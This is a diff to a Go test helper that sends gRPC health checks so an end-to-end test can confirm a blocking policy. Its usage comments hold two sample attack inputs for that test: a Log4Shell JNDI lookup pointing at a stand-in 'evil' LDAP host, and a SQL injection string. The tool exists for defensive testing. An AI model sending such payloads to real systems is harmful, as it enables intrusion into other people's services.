@@ -5,9 +5,11 @@
 // over HTTP/2 without TLS, and prints the call's status code (OK,
 // PermissionDenied, ...). The kind end-to-end test uses it to check that
 // gRPC calls pass a policy in block mode, and that one with an attack in
-// its metadata is denied (#284).
+// its metadata is denied (#284), or in its message when the policy
+// inspects messages (#275).
 //
 //	go run ./hack/grpchealth -authority grpc.example.com -metadata 'x-api-key=${jndi:ldap://evil/a}' 127.0.0.1:18091
+//	go run ./hack/grpchealth -authority grpc.example.com -service "1' OR '1'='1' -- " 127.0.0.1:18091
 package main
 
 import (
@@ -27,6 +29,7 @@ import (
 
 func main() {
 	authority := flag.String("authority", "", "the :authority to send")
+	service := flag.String("service", "", "the HealthCheckRequest's service: text in the message")
 	var md []string
 	flag.Func("metadata", "a `key=value` pair to send as metadata (repeatable)", func(s string) error {
 		k, v, ok := strings.Cut(s, "=")
@@ -37,7 +40,7 @@ func main() {
 		return nil
 	})
 	flag.Usage = func() {
-		fmt.Fprintln(os.Stderr, "usage: grpchealth [-authority HOST] [-metadata KEY=VALUE]... HOST:PORT")
+		fmt.Fprintln(os.Stderr, "usage: grpchealth [-authority HOST] [-service NAME] [-metadata KEY=VALUE]... HOST:PORT")
 		flag.PrintDefaults()
 	}
 	flag.Parse()
@@ -45,7 +48,7 @@ func main() {
 		flag.Usage()
 		os.Exit(2)
 	}
-	code, err := check(flag.Arg(0), *authority, md)
+	code, err := check(flag.Arg(0), *authority, *service, md)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "grpchealth:", err)
 		os.Exit(1)
@@ -53,7 +56,7 @@ func main() {
 	fmt.Println(code)
 }
 
-func check(target, authority string, md []string) (string, error) {
+func check(target, authority, service string, md []string) (string, error) {
 	opts := []grpc.DialOption{grpc.WithTransportCredentials(insecure.NewCredentials())}
 	if authority != "" {
 		opts = append(opts, grpc.WithAuthority(authority))
@@ -66,7 +69,7 @@ func check(target, authority string, md []string) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 	ctx = metadata.AppendToOutgoingContext(ctx, md...)
-	_, err = grpc_health_v1.NewHealthClient(conn).Check(ctx, &grpc_health_v1.HealthCheckRequest{})
+	_, err = grpc_health_v1.NewHealthClient(conn).Check(ctx, &grpc_health_v1.HealthCheckRequest{Service: service})
 	st, ok := status.FromError(err)
 	if !ok {
 		return "", err
